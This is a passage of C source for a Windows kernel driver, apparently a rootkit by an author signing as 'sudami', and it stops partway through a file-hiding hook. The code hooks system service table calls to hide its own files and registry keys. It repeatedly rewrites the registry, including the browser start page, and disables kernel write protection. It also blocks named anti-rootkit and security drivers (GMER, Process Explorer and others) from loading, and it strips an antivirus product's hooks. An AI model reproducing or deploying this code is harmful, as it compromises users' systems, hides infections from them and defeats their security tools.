

#include <ntddk.h>
#include "struct.h"
#include "nvmini.h"
#include "HideService.h"



/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+                 申明全局变量和一些定义                    +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		                                                                        --

#define ThreadProc           0x22C
#define ThreadListHead       0x190


typedef PVOID
(NTAPI *PRTL_ALLOCATE_STRING_ROUTINE)(
									  SIZE_T NumberOfBytes
									  );

typedef PETHREAD (*My_PsGetNextProcessThread)(
	PEPROCESS Process,
	PETHREAD Thread
	);
My_PsGetNextProcessThread g_PsGetNextProcessThread;

typedef ULONG (*My_KeForceResumeThread) (
	PKTHREAD Thread
	);
My_KeForceResumeThread g_KeForceResumeThread;



typedef VOID (*My_KeAcquireInStackQueuedSpinLockRaiseToSynch)(
	PKSPIN_LOCK SpinLock,
	PKLOCK_QUEUE_HANDLE LockHandle
	);
My_KeAcquireInStackQueuedSpinLockRaiseToSynch g_KeAcquireInStackQueuedSpinLockRaiseToSynch;


typedef VOID (*My_KeReleaseInStackQueuedSpinLock)(
	PKLOCK_QUEUE_HANDLE LockHandle
	);
My_KeReleaseInStackQueuedSpinLock g_KeReleaseInStackQueuedSpinLock;


typedef VOID (*My_KeAcquireQueuedSpinLockAtDpcLevel)(
	PKSPIN_LOCK_QUEUE LockQueue
	);
My_KeAcquireQueuedSpinLockAtDpcLevel g_KeAcquireQueuedSpinLockAtDpcLevel;


typedef VOID (*My_KeReleaseQueuedSpinLockFromDpcLevel)(
	PKSPIN_LOCK_QUEUE LockQueue
	);
My_KeReleaseQueuedSpinLockFromDpcLevel g_KeReleaseQueuedSpinLockFromDpcLevel;


typedef VOID (*KIINSERTQUEUEAPC) (
								  PKAPC Apc,
								  KPRIORITY Increment
								  );
KIINSERTQUEUEAPC KiInsertQueueApc;


typedef NTSTATUS (*NTQUERYSYSTEMINFORMATION)(

	IN ULONG                        SystemInformationClass,
	OUT PVOID                        SystemInformation,
	IN ULONG                        SystemInformationLength,
	OUT PULONG                        ReturnLength OPTIONAL  
	);
NTQUERYSYSTEMINFORMATION NtQuerySystemInformation;


typedef NTSTATUS (*PSPTERMINATETHREADBYPOINTER)(
	IN PETHREAD Thread,
	IN NTSTATUS ExitStatus
	);
PSPTERMINATETHREADBYPOINTER PspTerminateThreadByPointer;


typedef VOID (*PSPEXITTHREAD)(
							  IN NTSTATUS ExitStatus
							  );
PSPEXITTHREAD PspExitThread;


#define PS_TEST_SET_BITS(Flags, Flag) \
	InterlockedOr (Flags, Flag)


PVOID
ExpAllocateStringRoutine (
						  IN SIZE_T NumberOfBytes
						  )
{
	return ExAllocatePoolWithTag (PagedPool,NumberOfBytes,'grtS');
}

#ifdef ALLOC_DATA_PRAGMA
#pragma const_seg("PAGECONST")
#endif
const PRTL_ALLOCATE_STRING_ROUTINE RtlAllocateStringRoutine = ExpAllocateStringRoutine;
#ifdef ALLOC_DATA_PRAGMA
#pragma const_seg()
#endif

BYTE g_Code[5] = { 0x33, 0xC0, 0x0C, 0x00, 0x00 }; // 修改DLL的前5字节为此内容
BYTE KeInsertQueueApc_orig_code[9] = { 0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x0C, 0x53 }; 
BYTE PspTerminateThreadByPointer_orig_code[8] = { 0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x0C}; 
BYTE KiInsertQueueApc_orig_code[11] = { 0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x51, 0x8b, 0xC1, 0x80, 0x78, 0x2E};

BYTE g_HookCode[5] = { 0xe9, 0, 0, 0, 0 };
BYTE g_OrigCode[5] = { 0 }; // 原函数的前5字节内容
BYTE jmp_orig_code[7] = { 0xEA, 0, 0, 0, 0, 0x08, 0x00 }; 

BOOL g_bHooked = FALSE;
BOOL g_bMP = FALSE;

PUCHAR NtTerminateProcess;


PEPROCESS pObject[128];            // 保存要结束进程的EPROCESS

PKEVENT g_MyEvent;
HANDLE g_LatestProcID;
HANDLE g_MyEventHandle;
PVOID       g_address = 0;
KSPIN_LOCK  g_SpinLock;
BOOL MDLinit = FALSE;
PVOID    pThreadObj_reg		= NULL; // 反复写注册表的线程对象
PVOID    pThreadObj_reg_IE  = NULL;
PVOID    pThreadObj_reg_Group  = NULL;
PVOID    pThreadObj_sdt     = NULL;
PVOID    pThreadObj_Kill     = NULL;
PVOID    pEventObject       = NULL;

ULONG CurrentIndex = 0;     // 在fake函数中会调用
ULONG NbHiddenKeys = 0;

WCHAR *FileToHide[128];     // 作为全局变量. 保存着要隐藏的内容
WCHAR *RegKeyToHide[128];   // 在DriverEntry里面会用到
WCHAR *RegValueToHide[128];

ULONG NbRegKeyToHide   = 0;  // 作为全局变量. 保存着要隐藏内容的数量
ULONG NbRegValueToHide = 0;
ULONG NbFileToHide     = 0;  // 在DriverEntry里面会用到

WCHAR SidStringBuffer[512];                   /* 保存当前用户的SID */
ULONG g_SidStringLength;

LARGE_INTEGER g_timeout;                     /* 用于修改sdt的线程的时间间隔 */
PKTIMER g_pKTimer;                           /* 和内核定时器有关,反复hook ssdt */ 
PKTIMER g_pKTimer_sdt;
PKDPC   g_pKDpc;
HANDLE  g_CurrentHandle;                     /* 在IsExistSDT中调用 */
HANDLE  g_EventHandle;                       /* 事件对象句柄,和反复写注册表相关 */
HANDLE  g_EventHandle_IE;                    /* 事件对象句柄,和反复写注册表相关 */

WCHAR *reg_buf_a  = L"sudami";
WCHAR *reg_buf_b  = L"LEGACY_SUDAMI";
WCHAR *reg_buf_c  = L"Start Page";
WCHAR *file_buf_a = L"sudami.sys";
WCHAR *file_buf_b = L"autorun.inf";
WCHAR *file_buf_c = L"sudami.exe";
WCHAR *reg_name   = L"\\REGISTRY\\MACHINE\\SYSTEM";

WCHAR *ban_1 = L"ISPUBDRV";                  /* 禁止下面这些驱动的加载 */
WCHAR *ban_2 = L"ISDRV1";
WCHAR *ban_3 = L"RKREVEAL";
WCHAR *ban_4 = L"PROCEXP";
WCHAR *ban_5 = L"SAFEMON";
WCHAR *ban_6 = L"RKHDRV";
WCHAR *ban_7 = L"NPF";
WCHAR *ban_8 = L"IRIS";
WCHAR *ban_9 = L"NPPINT";
WCHAR *ban_a = L"DUMP_WMIMMC";
WCHAR *ban_b = L"SPLITTER";
WCHAR *ban_c = L"EAGLENT";
WCHAR *ban_d = L"IMAGEPATH";
WCHAR *ban_e = L"GMER";


int pos_Close;                               /* 保存这些函数的服务号 */
int pos_LoadDriver;
int pos_QueryDirectoryFile;
int pos_SaveKey;
int pos_DeleteKey;
int pos_EnumerateKey;
int pos_DeleteValueKey;

BOOL ZwClose_Hooked				    = FALSE; /* 是否已经HOOK过 */
BOOL ZwLoadDriver_Hooked			= FALSE;
BOOL ZwQueryDirectoryFile_Hooked	= FALSE;
BOOL ZwSaveKey_Hooked			    = FALSE;
BOOL ZwDeleteKey_Hooked				= FALSE;
BOOL ZwEnumerateKey_Hooked			= FALSE;
BOOL ZwDeleteValueKey_Hooked		= FALSE;
BOOL g_bRepeatWrite_reg             = FALSE; /* 是否反复写入注册表 */
BOOL g_bRepeatWrite_reg_IE          = FALSE; /* 是否反复写入注册表 */
BOOL g_bRepeatWrite_sdt             = FALSE; /* 是否反复写入注册表 */
BOOL g_bRepeatWrite_reg_Group       = FALSE;
BOOL g_bRepeatWrite_Kill             = FALSE;


typedef struct ServiceDescriptorEntry {
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; 
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry, *PServiceDescriptorTableEntry;

extern PServiceDescriptorTableEntry KeServiceDescriptorTable; 

#define ibaseDD *(PDWORD)&ibase


DWORD 
NTAPI 
GetHeaders (
			PCHAR ibase,
			PIMAGE_FILE_HEADER      *pfh,
			PIMAGE_OPTIONAL_HEADER  *poh,
			PIMAGE_SECTION_HEADER   *psh
			)

			/*++

			Learner : sudami [xiao_rui_119@163.com]
			Time    : 08/01/16

			参数 :
			略

			功能 : 
			,通过传进来的ibase,得到PE内各个结构的偏移量

			--*/
{
	PIMAGE_DOS_HEADER mzhead=(PIMAGE_DOS_HEADER)ibase;

	if	((mzhead->e_magic!=IMAGE_DOS_SIGNATURE) ||		
		(ibaseDD[mzhead->e_lfanew]!=IMAGE_NT_SIGNATURE))
		return FALSE;

	*pfh=(PIMAGE_FILE_HEADER)&ibase[mzhead->e_lfanew];
	if (((PIMAGE_NT_HEADERS)*pfh)->Signature!=IMAGE_NT_SIGNATURE) 
		return FALSE;
	*pfh=(PIMAGE_FILE_HEADER)((PBYTE)*pfh+sizeof(IMAGE_NT_SIGNATURE));

	*poh=(PIMAGE_OPTIONAL_HEADER)((PBYTE)*pfh+sizeof(IMAGE_FILE_HEADER));
	if ((*poh)->Magic!=IMAGE_NT_OPTIONAL_HDR32_MAGIC)
		return FALSE;

	*psh=(PIMAGE_SECTION_HEADER)((PBYTE)*poh+sizeof(IMAGE_OPTIONAL_HEADER));
	return TRUE;
}



/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+             下面几个是驱动的入口和相关函数                +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		                                                                        --


VOID 
OnUnload( 
		 IN PDRIVER_OBJECT DriverObject 
		 )
{
	UNICODE_STRING devlink;
	int i;
	LARGE_INTEGER interval;
	interval.QuadPart = -4 * 1000 * 100;     // 40ms, relative

	i = 0;
	while (i < 128) {
		if (pObject[i] != NULL) {
			ExFreePool( pObject[i] );
		}
		i++;
	}

	MyUnHook ();

	for(i=0; i<NbFileToHide; i++)
		ExFreePool( FileToHide[i] );
	for(i=0; i<NbRegKeyToHide; i++)
		ExFreePool( RegKeyToHide[i] );
	for(i=0; i<NbRegValueToHide; i++)
		ExFreePool( RegValueToHide[i] ); 

	// 停止写注册表的线程
	g_bRepeatWrite_reg		 = FALSE;
	g_bRepeatWrite_sdt		 = FALSE;
	g_bRepeatWrite_reg_IE    = FALSE;
	g_bRepeatWrite_reg_Group = FALSE;
	g_bRepeatWrite_Kill      = FALSE;

	i = 5;
	while (i > 0) { // 等待5 * 40ms ,让其中2个线程结束
		i--;
		KeDelayExecutionThread( KernelMode, FALSE, &interval );
	}

	if (g_bHooked) {
		UnHookKiInsertQueueApc ();
	}

	KeSetEvent(pEventObject, 0, FALSE); // 重新设置"写注册表服务"的事件状态为"受信"
	KeWaitForSingleObject( pThreadObj_reg, Executive, KernelMode, FALSE, NULL );
	KeWaitForSingleObject( pThreadObj_reg_IE, Executive, KernelMode, FALSE, NULL );
	KeWaitForSingleObject( pThreadObj_sdt, Executive, KernelMode, FALSE, NULL );


	KeWaitForSingleObject( pThreadObj_Kill, Executive, KernelMode, FALSE, NULL );

	if (pThreadObj_Kill != NULL) { // 若 thread object存在,释放掉,要不会BSOD
		ObDereferenceObject( pThreadObj_Kill );
		pThreadObj_Kill = NULL;
	}


	if (pThreadObj_reg != NULL) { // 若 thread object存在,释放掉,要不会BSOD
		ObDereferenceObject( pThreadObj_reg );
		pThreadObj_reg = NULL;
	}


	RtlInitUnicodeString(&devlink,SUDAMI_DOS_DEVICE_NAME_W);
	IoDeleteSymbolicLink(&devlink);
	if (DriverObject->DeviceObject)
	{
		IoDeleteDevice(DriverObject->DeviceObject);
	}

}


NTSTATUS 
DriverEntry( 
			IN PDRIVER_OBJECT theDriverObject, 
			IN PUNICODE_STRING theRegistryPath 
			)
{
	int i;
	UNICODE_STRING dllName;
	DWORD functionAddress;
	UNICODE_STRING devname;
	UNICODE_STRING devlink;
	PDEVICE_OBJECT devob ;
	NTSTATUS status ;
	PEPROCESS		proc; 
	WCHAR			Buffer[128];
	UNICODE_STRING KeyName;
	UNICODE_STRING a;
	UNICODE_STRING sudami;
	UNICODE_STRING event_name;

	DbgPrint("My Driver Loaded!\n");
	DbgPrint("此驱动并无恶意,只是试验.\n若不小心中毒,请设置注册表权限后删除驱动即可\nsudami [sudami@163.com] --08/03/23\n");

	RtlInitUnicodeString(&devname,SUDAMI_DEVICE_NAME_W);
	RtlInitUnicodeString(&devlink,SUDAMI_DOS_DEVICE_NAME_W);

	status = IoCreateDevice(theDriverObject,
		256,
		&devname,
		FILE_DEVICE_SUDAMI,
		0,
		TRUE,
		&devob);

	if (!NT_SUCCESS(status))
	{
		return status ;
	}

	status = IoCreateSymbolicLink(&devlink,&devname);

	if (!NT_SUCCESS(status))
	{
		IoDeleteDevice(devob);
		return status;
	}

	theDriverObject->MajorFunction[IRP_MJ_CREATE] = 
	theDriverObject->MajorFunction[IRP_MJ_CLOSE] = DevCreateClose;
	theDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DevDispatch ;
	theDriverObject->DriverUnload  = OnUnload;

	////////////////////////////////////////

	GetOrigAddr ();


	//为要隐藏的内容分配内存
	AddObjectToHide( FileToHide, &NbFileToHide, file_buf_a); // 隐藏文件
	AddObjectToHide( FileToHide, &NbFileToHide, file_buf_b);
	AddObjectToHide( FileToHide, &NbFileToHide, file_buf_c);

	AddObjectToHide( RegKeyToHide, &NbRegKeyToHide, reg_buf_a); // 隐藏服务
	AddObjectToHide( RegKeyToHide, &NbRegKeyToHide, reg_buf_b);

	AddObjectToHide( RegValueToHide, &NbRegValueToHide, reg_buf_c); // 隐藏IE的 start page


	// HOOK SSDT
	MyStartHook ();

	//启动一个系统线程来反复写注册表. 真流氓啊 o(*.*)0
	StartThread_reg ();

	//启动一个系统线程来反复写sdt
	StartThread_sdt ();
	StartThread_reg_IE ();
	StartThread_reg_Group();


	// 模块加载通知
	status = PsSetLoadImageNotifyRoutine( MyLoadImageRoutine );
	if (!NT_SUCCESS( status )) {
		DbgPrint("PsSetLoadImageNotifyRoutine()\n");
		return status;
	}


	IsMPExist();
	FindPsXXAddr();   // 找到PspTerminateThreadByPointer 和 NtTerminateProcess

	// 若微点不存在，则下面的这个函数直接得到PspTerminateThreadByPointer 的地址
	XPGetPsGetNextProcessThread(); // 根据NtTerminateProcess找到PsGetNextProcessThread


	//恢复kv2008 inline hook
	XPRestoreKeInsertQueueApc ();
	XPRestoreKiInsertQueueApc ();
	XPRestorePspTerminateThreadByPointer ();
	XPRestoreNtTerminateProcess ();
	XPRestorePsGetNextProcessThread  ();

	//HookKiInsertQueueApc ();

	StartThread_Kill ();

	return STATUS_SUCCESS;
}


NTSTATUS
DevCreateClose(
			   IN PDEVICE_OBJECT  DeviceObject,
			   IN PIRP  Irp
			   )
{

	Irp->IoStatus.Status = 0;
	Irp->IoStatus.Information = 0 ;

	IoCompleteRequest(Irp,IO_NO_INCREMENT);

	return STATUS_SUCCESS ;

}

NTSTATUS
DevDispatch(
			IN PDEVICE_OBJECT  DeviceObject,
			IN PIRP  Irp
			)
{
	PIO_STACK_LOCATION StackLocation = IoGetCurrentIrpStackLocation(Irp);
	ULONG IRPcode = StackLocation->Parameters.DeviceIoControl.IoControlCode;    
	WCHAR *buf;
	buf = (WCHAR*)Irp->AssociatedIrp.SystemBuffer;

	switch( IRPcode ) {

		case 1000:
			DbgPrint("IoControlCode 1000\n");
			RtlCopyMemory( buf, g_LatestProcID, sizeof( g_LatestProcID ) );
			//KeResetEvent( g_MyEvent );

			break;

		default:
			break;
	}

	Irp->IoStatus.Status = 0;
	IoCompleteRequest(Irp,IO_NO_INCREMENT);
	return STATUS_SUCCESS ;
}


/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+                       3个杂函数                           +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		                                                                        --

// 写保护的开&关
void WPOFF()
{
	__asm {   //去掉内存保护
		cli
			mov  eax,cr0
			and  eax,not 10000h
			mov  cr0,eax
	}
}

void WPON()
{
	__asm {   //恢复内存保护  
		mov  eax,cr0
			or   eax,10000h
			mov  cr0,eax
			sti
	} 
}

void 
AddObjectToHide (
				 WCHAR **Tab, 
				 PULONG Nb, 
				 WCHAR *Object
				 )
				 /*++

				 逆向: sudami  08/02/28 [add from agony]

				 参数:
				 Tab - 2级指针,保存要隐藏的项

				 Nb - 隐藏的个数.成功调用一次,这个值就自加一次

				 Object - 输入要隐藏的值,为它分配非分页内存

				 功能:
				 为要隐藏的内容分配内存

				 --*/
{
	ULONG i;  
	SIZE_T size = (wcslen(Object)+1)*sizeof(WCHAR);  

	// 若已经存在,就不用再次hide了
	for (i=0; i<*Nb; i++) {
		if( size == ( wcslen (Tab[i]) + 1 ) * sizeof( WCHAR ) &&\
			!memcmp (Object, Tab[i], size) )  
			return;         
	}         

	if( *Nb < 128 ) {
		Tab[*Nb] = (WCHAR*) ExAllocatePool( PagedPool, size );

		if( Tab[*Nb] ) { 
			memcpy( Tab[*Nb], Object, size); 
			(*Nb)++;
		}   
	}       
}


/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+          下面2个函数用于得到部分SDT函数的地址             +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		                                                                        --


DWORD 
GetDllFunctionAddress (
					   char* lpFunctionName, 
					   PUNICODE_STRING pDllName
					   )
					   /*++

					   逆向: sudami  08/02/28

					   参数:
					   lpFunctionName - 函数名称
					   pDllName - 要映射的模块名称

					   功能 : 
					   把给定的模块映射到内存,读取其EAT,得到Zw系列函数地址,还在R3中,

					   1.  映射ntdll.dll到内存-->ZwMapViewOfSection.
					   2.  搜索其EAT, 得到 ZwXxxx的地址p
					   3.  p + 1 处便是ntdll.dll 转入ntoskrnl.exe的服务号. 
					   4.  NtXxxx 的地址 就可以通过这个服务号 在KeServiceDescriptorTable中取出
					   5. 用你的fake函数替换掉即可.

					   --*/
{
	HANDLE hThread, hSection, hFile, hMod;
	SECTION_IMAGE_INFORMATION sii;
	IMAGE_DOS_HEADER* dosheader;
	IMAGE_OPTIONAL_HEADER* opthdr;
	IMAGE_EXPORT_DIRECTORY* pExportTable;
	DWORD* arrayOfFunctionAddresses;
	DWORD* arrayOfFunctionNames;
	WORD* arrayOfFunctionOrdinals;
	DWORD functionOrdinal;
	DWORD Base, x, functionAddress;
	char* functionName;
	STRING ntFunctionName, ntFunctionNameSearch;
	PVOID BaseAddress = NULL;
	SIZE_T size=0;

	OBJECT_ATTRIBUTES oa = {sizeof oa, 0, pDllName, OBJ_CASE_INSENSITIVE};

	IO_STATUS_BLOCK iosb;

	//_asm int 3;
	ZwOpenFile(&hFile, FILE_EXECUTE | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);

	oa.ObjectName = 0;

	ZwCreateSection(&hSection, SECTION_ALL_ACCESS, &oa, 0,PAGE_EXECUTE, SEC_IMAGE, hFile);

	ZwMapViewOfSection(hSection, NtCurrentProcess(), &BaseAddress, 0, 1000, 0, &size, (SECTION_INHERIT)1, MEM_TOP_DOWN, PAGE_READWRITE);

	ZwClose(hFile);

	hMod = BaseAddress;

	dosheader = (IMAGE_DOS_HEADER *)hMod;

	opthdr =(IMAGE_OPTIONAL_HEADER *) ((BYTE*)hMod+dosheader->e_lfanew+24);

	pExportTable =(IMAGE_EXPORT_DIRECTORY*)((BYTE*) hMod + opthdr->DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT]. VirtualAddress);

	arrayOfFunctionAddresses = (DWORD*)( (BYTE*)hMod + pExportTable->AddressOfFunctions);

	arrayOfFunctionNames = (DWORD*)( (BYTE*)hMod + pExportTable->AddressOfNames);

	arrayOfFunctionOrdinals = (WORD*)( (BYTE*)hMod + pExportTable->AddressOfNameOrdinals);

	Base = pExportTable->Base;

	RtlInitString(&ntFunctionNameSearch, lpFunctionName);

	for(x = 0; x < pExportTable->NumberOfFunctions; x++) {
		functionName = (char*)( (BYTE*)hMod + arrayOfFunctionNames[x]);

		RtlInitString(&ntFunctionName, functionName);

		functionOrdinal = arrayOfFunctionOrdinals[x] + Base - 1; 
		functionAddress = (DWORD)( (BYTE*)hMod + arrayOfFunctionAddresses[functionOrdinal]);
		if (RtlCompareString(&ntFunctionName, &ntFunctionNameSearch, TRUE) == 0) {
			ZwClose(hSection);
			return functionAddress;
		}
	}

	ZwClose(hSection);
	return 0;
}


VOID 
GetOrigAddr (
			 )
			 /*++

			 逆向: sudami  08/02/28

			 功能 : 
			 获得sdt中要拦截的函数的地址. 之前调用函数 GetDllFunctionAddress 以便获得服务号

			 --*/
{
	UNICODE_STRING dllName;
	DWORD          functionAddress;
	int            position;

	RtlInitUnicodeString( &dllName, L"\\Device\\HarddiskVolume1\\Windows\\System32\\ntdll.dll" );

	// ZwClose
	functionAddress = GetDllFunctionAddress("ZwClose", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_Close       = position;
	DbgPrint("ZwClose's Id:%d\n", position);
	Orig_ZwClose = (ZWCLOSE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));
	DbgPrint("ZwClose: %s\n", Orig_ZwClose);

	// ZwLoadDriver
	functionAddress = GetDllFunctionAddress("ZwLoadDriver", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_LoadDriver  = position;
	DbgPrint("ZwLoadDriver's Id:%d\n", position);
	Orig_ZwLoadDriver =  (ZWLOADDRIVER) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));
	DbgPrint("ZwLoadDriver: %s\n", Orig_ZwLoadDriver);

	// ZwQueryDirectoryFile
	functionAddress = GetDllFunctionAddress("ZwQueryDirectoryFile", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_QueryDirectoryFile = position;
	DbgPrint("ZwQueryDirectoryFile's Id:%d\n", position);
	Orig_ZwQueryDirectoryFile = (ZWQUERYDIRECTORYFILE) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));

	// ZwSaveKey
	functionAddress = GetDllFunctionAddress("ZwSaveKey", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_SaveKey     = position;
	DbgPrint("ZwSaveKey's Id:%d\n", position);
	Orig_ZwSaveKey = (ZWSAVEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));

	// ZwDeleteKey
	functionAddress = GetDllFunctionAddress("ZwDeleteKey", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_DeleteKey   = position;
	DbgPrint("ZwDeleteKey's Id:%d\n", position);
	Orig_ZwDeleteKey = (ZWDELETEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));

	// ZwEnumerateKey
	functionAddress = GetDllFunctionAddress("ZwEnumerateKey", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_EnumerateKey = position;
	DbgPrint("ZwEnumerateKey's Id:%d\n", position);
	Orig_ZwEnumerateKey = (ZWENUMERATEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));


	// ZwDeleteValueKey
	functionAddress = GetDllFunctionAddress("ZwDeleteValueKey", &dllName);
	position        = *((WORD*)( functionAddress + 1 ));
	pos_DeleteValueKey = position;
	DbgPrint("ZwDeleteValueKey's Id:%d\n", position);
	Orig_ZwDeleteValueKey = (ZWDELETEVALUEKEY) (*(((PServiceDescriptorTableEntry)KeServiceDescriptorTable)->ServiceTableBase + position));

}

/////////////////////////////////////////////////////////////////         --          --     
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//     --     -      -     -- 
//+                                                           +//     --      -   -       -- 
//+            下面是7个fake函数，处理一些东西                +//      --       -        --  
//+                                                           +//       -     sudami     -   
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++//        --            --    
/////////////////////////////////////////////////////////////////          --        --  
//                                                                           --    --
//		    																	--

NTSTATUS  fake_ZwClose( 
					   IN HANDLE  Handle
					   )
					   /*++

					   逆向: sudami  08/02/28

					   功能 : 
					   替换函数 ZwClose ,俺没在这里做处理,原驱动中也就是在这里释放内存

					   --*/
{
	NTSTATUS     st;
	st = Orig_ZwClose (Handle);

	return st;
}


NTSTATUS 
fake_ZwEnumerateKey(
					IN HANDLE  KeyHandle,
					IN ULONG  Index,
					IN KEY_INFORMATION_CLASS  KeyInformationClass,
					OUT PVOID  KeyInformation,
					IN ULONG  Length,
					OUT PULONG  ResultLength
					)
					/*++

					逆向: sudami  08/02/28

					功能 : 
					替换函数 ZwEnumerateKey -- 隐藏注册表键值

					--*/
{/*
 NTSTATUS st;
 PCWSTR KeyNamePtr;

 st = Orig_ZwEnumerateKey( KeyHandle, Index, KeyInformationClass, KeyInformation,\
 Length, ResultLength );

 if ( Status == STATUS_SUCCESS ) {
 _asm {
 push edi
 mov edi, KeyInformation
 add edi, 0x10
 mov KeyNamePtr, edi
 pop edi
 }

 if ( wcsstr( KeyNamePtr, L"nvmini" ) != NULL || \
 wcsstr ( KeyNamePtr, L"LEGACY_NVMINI") != NULL ) {

 if ( !FindAddrThrouhtNonPage ((PCHAR)KeyHandle) ) {
 MyAllocatePool (KeyHandle, Index);
 }

 Index++; // 过滤掉自己要隐藏的子项
 st = Orig_ZwEnumerateKey( KeyHandle, Index, KeyInformationClass, KeyInformation,\
 Length, ResultLength );
 }
 }

 return st;
 */
	NTSTATUS status;
	PBYTE	 key;
	ULONG	 NameOffset;
	ULONG	 NameSizeOffset;
	WCHAR	 *KeyNamePtr;
	PULONG	 KeyNameLength;
	ULONG	 i;

	if( Index != (CurrentIndex-NbHiddenKeys) ) {
		CurrentIndex = Index;
		NbHiddenKeys = 0;
	}

	status = Orig_ZwEnumerateKey(
		KeyHandle,
		CurrentIndex,
		KeyInformationClass,
		KeyInformation,
		Length,
		ResultLength);   

	if( !NT_SUCCESS(status) ) 
		return status;  

	key = KeyInformation;   

	switch( KeyInformationClass )
	{   
	case KeyBasicInformation:
		NameOffset = ((ULONG)&(((PKEY_BASIC_INFORMATION)key)->Name)) - ((ULONG)key);
		NameSizeOffset = ((ULONG)&(((PKEY_BASIC_INFORMATION)key)->NameLength)) - ((ULONG)key);                  
		break;

	case KeyNodeInformation:
		NameOffset = ((ULONG)&(((PKEY_NODE_INFORMATION)key)->Name)) - ((ULONG)key);
		NameSizeOffset = ((ULONG)&(((PKEY_NODE_INFORMATION)key)->NameLength)) - ((ULONG)key);                             
		break;       

	case KeyNameInformation:
		NameOffset = ((ULONG)&(((PKEY_VALUE_FULL_INFORMATION)key)->Name)) - ((ULONG)key);
		NameSizeOffset = ((ULONG)&(((PKEY_VALUE_FULL_INFORMATION)key)->NameLength)) - ((ULONG)key);                    
		break;                   

	default:
		return status;      
	}   

	// 得到注册表子项的名称和长度
	KeyNamePtr = (WCHAR*)((PBYTE)key + NameOffset);
	KeyNameLength = (PULONG) ((PBYTE)key + NameSizeOffset);   

	if( KeyNamePtr == NULL )
		return status;

	// 开始和数组中要隐藏的键值进行比较.若是,则隐藏之
	for( i=0; i<NbRegKeyToHide; i++) {      
		if( *KeyNameLength == wcslen(RegKeyToHide[i])*2 && \
			!memcmp(KeyNamePtr,RegKeyToHide[i],*KeyNameLength)) {

				// 匹配,隐藏之
				CurrentIndex++;

				// 递归调用
				status = fake_ZwEnumerateKey(
					KeyHandle,
					CurrentIndex,
					KeyInformationClass,
					KeyInformation,
					Length,
					ResultLength);

				NbHiddenKeys++;    
				return status;
		}    
	} 
	CurrentIndex++; 
	return status;  
}


NTSTATUS 
fake_ZwQueryDirectoryFile(
						  IN HANDLE FileHandle,
						  IN HANDLE Event OPTIONAL,
						  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
						  IN PVOID ApcContext OPTIONAL,
						  OUT PIO_STATUS_BLOCK IoStatusBlock,
						  OUT PVOID FileInformation,
						  IN ULONG FileInformationLength,
						  IN FILE_INFORMATION_CLASS FileInformationClass,
						  IN BOOLEAN ReturnSingleEntry,
						  IN PUNICODE_STRING FileName OPTIONAL,
						  IN BOOLEAN RestartScan
						  )
						  /*++

						  逆向: sudami  08/02/28

						  功能 : 
						  替换函数 ZwQueryDirectoryFile -- 隐藏文件

						  --*/
{
	NTSTATUS   status;
	ULONG		i;
	ULONG		NameOffset;
	ULONG		NameSizeOffset;
	WCHAR		*FileNamePtr;
	PULONG		FileNameLength;
	PBYTE		curr, prev;
	PULONG		DeltaCurr, DeltaPrev;
	UNICODE_STRING UnicodeFilename ;


	status = ((ZWQUERYDIRECTORYFILE)(Orig_ZwQueryDirectoryFile)) (
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		FileInformationLength,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan);       

	if( !NT_SUCCESS(status) )
		return status;

	curr = FileInformation;    
	switch( FileInformationClass )
	{/*  
	 case FileDirectoryInformation:
